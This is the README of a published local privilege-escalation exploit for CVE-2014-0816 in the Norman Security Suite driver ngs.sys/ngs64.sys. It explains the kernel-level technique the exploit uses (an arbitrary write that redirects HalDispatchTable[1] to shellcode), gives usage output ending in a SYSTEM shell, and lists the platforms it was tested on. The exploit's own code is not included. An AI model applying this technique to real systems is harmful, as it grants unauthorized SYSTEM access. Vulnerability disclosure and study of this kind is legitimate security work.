CVE-2014-0816
=============

This is an exploit for CVE-2014-0816 ([JVNDB-2014-000026](http://jvndb.jvn.jp/en/contents/2014/JVNDB-2014-000026.html): Norman Security Suite vulnerable to privilege escalation). 

This exploit launches CMD.exe with SYSTEM privilege from Non-Administrator privilege by exploiting the vulnerability in an IOCTL handler of ngs.sys / ngs64.sys.     
    

Usage
-----------------
    C:\Users\user\Desktop> exploit_ngs.exe
    [*] Exploit Norman General Security Driver (ngs.sys / ngs64.sys)
    [*] Target file version: ver 5.0.740.0.
    [*] An address file was created at C:\Users\user\Desktop\address.bin.
    [*] Shellcode is located at 000000013F9357D0.
    [*] The device was opened as 0000000000000044.
    [*] The address file was opened as FFFFFFFF80000558.
    [+] HalDispatchTable[1] is located at FFFFF800033FDC68.
    [+] HalDispatchTable[1] was altered.
    [+] Shellcode was executed.
    [+] The SYSTEM shell was launched.
    [*] Press any key to finish this program.
 
Then you will see a new console.

    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Users\user\Desktop>whoami
    nt authority\system

    
The vulnerability allows an attacker to overwrite an arbitrary address with arbitrary value, so this exploit changes the value of HalDispatchTable[1] with an address of shellcode that escalates privilege of current process to SYSTEM privilege. 

![demo_win7_x64](/img/demo_win7_x64.png)

This vulnerability will be exploitable on all platforms from Windows XP to 8 both x86/x64, but this exploit is designed and tested certain platforms (for example, it will not function on Windows 8 because of SMEP).

Tested Platforms
-----------------
- Norman Security Suite 10.1
 - 2ad60239e6637132fcaa816348c6ec3b358db49e (ngs.sys)
 - 21da5771db8308292c9d88a16b73260be40f0b09 (ngs.sys)
 - d2e34871d4d0fe04087e89f9c9f3599193b8258a (ngs64.sys)
 - fa1ed5997466263c8f91d8a4f3a80e3712cf777e (ngs64.sys)
- Windows XP (x86) SP3 with Guest privilege
- Windows 7 (x86/x64) SP1 with Guest privilege
- Windows 10 (x64) Build 14393 with Guest privilege (SMEP disabled)

License
-----------------
This software is released under the MIT License, see LICENSE.

